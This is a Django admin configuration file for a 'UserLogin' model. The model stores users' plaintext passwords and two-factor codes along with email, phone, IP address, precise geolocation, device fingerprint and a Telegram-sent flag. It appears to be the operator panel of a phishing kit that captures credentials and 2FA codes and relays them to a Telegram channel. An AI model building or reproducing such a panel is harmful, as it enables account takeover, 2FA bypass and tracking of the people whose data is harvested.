from django.contrib import admin
from .models import UserLogin


@admin.register(UserLogin)
class UserLoginAdmin(admin.ModelAdmin):
    list_display = ('email', 'username', 'phone_number', 'country', 'city', 'browser_name', 'device_type', 'login_time')
    list_filter = ('login_time', 'country', 'device_type', 'browser_name', 'telegram_sent')
    search_fields = ('email', 'username', 'phone_number', 'ip_address', 'country', 'city')
    readonly_fields = ('login_time', 'two_fa_time', 'telegram_sent_time')

    fieldsets = (
        ('User Information', {
            'fields': ('email', 'phone_number', 'username', 'password', 'two_fa_code')
        }),
        ('Location Data', {
            'fields': ('ip_address', 'country', 'city', 'region', 'isp', 'latitude', 'longitude')
        }),
        ('Device & Browser Info', {
            'fields': ('browser_name', 'browser_version', 'os_name', 'device_type', 'screen_resolution', 'user_agent')
        }),
        ('System Info', {
            'fields': ('timezone', 'language', 'referrer', 'connection_type')
        }),
        ('Timestamps', {
            'fields': ('login_time', 'two_fa_time', 'telegram_sent', 'telegram_sent_time')
        }),
    )

    def has_add_permission(self, request):
        return False

    def has_change_permission(self, request, obj=None):
        return False